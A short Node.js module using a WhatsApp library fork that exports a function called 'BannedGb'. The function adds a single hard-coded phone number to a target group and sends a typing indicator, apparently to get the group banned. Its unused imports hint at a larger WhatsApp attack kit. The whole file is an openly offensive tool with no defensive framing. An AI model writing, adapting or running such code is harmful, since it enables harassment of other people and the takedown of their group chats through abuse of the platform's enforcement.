const { default: makeWASocket, useMultiFileAuthState, Browsers, delay, proto, DisconnectReason, makeCacheableSignalKeyStore, generateWAMessageFromContent, groupStatusMessageV2 } = require('@sakataoffc/baileys');
const pino = require('pino');
const crypto = require('crypto');

async function BannedGb(sock, groupJid) {
  if (!groupJid.endsWith('@g.us')) {
    throw new Error('@g.us server required');
  }

  let group = groupJid;

  try {
    await sock.groupParticipantsUpdate(
      group,
      ['18188880008@s.whatsapp.net'],
      'add',
    );

    await sock.sendPresenceUpdate('composing', group);
  } catch (err) {
    console.error('error:', err);
    throw err;
  }
}

module.exports = { BannedGb };